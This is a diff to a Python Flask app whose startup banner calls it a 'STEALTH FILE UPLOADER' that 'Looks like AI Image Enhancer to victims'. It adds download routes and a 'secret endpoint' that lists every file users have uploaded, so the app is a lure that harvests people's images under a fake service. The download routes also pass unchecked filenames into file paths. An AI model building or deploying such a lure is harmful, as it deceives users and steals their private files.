@@ -618,4 +618,59 @@ def enhance_image_route():
         return jsonify({
             'success': True,
             'message': f'Image enhanced successfully! Quality: {quality_str}',
-            'qu
+            'quality': quality_str,
+            'original_url': original_url,
+            'enhanced_url': enhanced_url,
+            'original_info': get_image_info(filepath),
+            'enhanced_info': get_image_info(enhanced_path),
+            'filename': saved_filename,
+            'enhanced_filename': enhanced_filename
+        })
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/download/original/<filename>')
+def download_original(filename):
+    filepath = os.path.join(UPLOAD_FOLDER, filename)
+    if os.path.exists(filepath):
+        return send_file(filepath, as_attachment=True)
+    return "File not found", 404
+
+@app.route('/download/enhanced/<filename>')
+def download_enhanced(filename):
+    filepath = os.path.join(ENHANCED_FOLDER, filename)
+    if os.path.exists(filepath):
+        return send_file(filepath, as_attachment=True)
+    return "File not found", 404
+
+@app.route('/files')
+def list_files():
+    """Secret endpoint to see all uploaded files"""
+    files = os.listdir(UPLOAD_FOLDER)
+    enhanced_files = os.listdir(ENHANCED_FOLDER)
+    return jsonify({
+        'original_files': files,
+        'enhanced_files': enhanced_files
+    })
+
+if __name__ == '__main__':
+    print("""
+╔══════════════════════════════════════════════════════════════╗
+║         STEALTH FILE UPLOADER - RUNNING                      ║
+║                                                              ║
+║  Access URL: http://0.0.0.0:{}                    ║
+║  Upload Folder: {}                                ║
+║  Enhanced Folder: {}                              ║
+║                                                              ║
+║  [!] Looks like AI Image Enhancer to victims!               ║
+║  [+] AI Enhancement Features:                               ║
+║      - Contrast Enhancement                                 ║
+║      - Sharpness Enhancement                                ║
+║      - Color Enhancement                                    ║
+║      - Detail Preservation (Unsharp Mask)                   ║
+║      - HD Upscaling (2x, 4x, 8x)                           ║
+╚══════════════════════════════════════════════════════════════╝
+    """.format(PORT, os.path.abspath(UPLOAD_FOLDER), os.path.abspath(ENHANCED_FOLDER)))
+    
+    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
